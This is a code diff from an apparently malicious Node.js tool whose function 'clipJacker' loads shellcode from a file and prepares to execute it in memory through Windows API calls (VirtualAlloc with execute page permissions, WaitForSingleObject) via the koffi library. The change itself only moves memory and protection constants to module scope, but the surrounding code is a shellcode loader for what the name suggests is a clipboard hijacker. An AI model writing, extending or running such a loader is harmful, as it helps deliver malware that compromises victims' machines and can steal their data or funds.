@@ -3,6 +3,16 @@
 const fs = require('fs').promises;
 const koffi = require('koffi');
 
+const MEM_COMMIT  = 0x1000;
+const MEM_RESERVE = 0x2000;
+
+const PAGE_READWRITE         = 0x04;
+const PAGE_EXECUTE_READ      = 0x20;
+const PAGE_EXECUTE_READWRITE = 0x40;
+
+const INFINITE = 0xFFFFFFFF;
+
+
 async function clipJacker(filePath) {
   // ── CONFIG ───────────────────────────────────────────────
   const SHELLCODE_FILE = filePath || './bytes.h';
@@ -57,13 +67,7 @@ async function clipJacker(filePath) {
     'uint32_t __stdcall WaitForSingleObject(void * hHandle, uint32_t dwMilliseconds)'
   );
 
-  // Constants
-  const MEM_COMMIT              = 0x1000;
-  const MEM_RESERVE             = 0x2000;
-  const PAGE_READWRITE          = 0x04;
-  const PAGE_EXECUTE_READ       = 0x20;
-  const PAGE_EXECUTE_READWRITE  = 0x40;
-  const INFINITE                = 0xFFFFFFFF;
+
 
   // 3. Allocate RW memory
   const addr = VirtualAlloc(null, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -117,3 +121,4 @@ if (args.length > 0) {
   });
 
 }
+
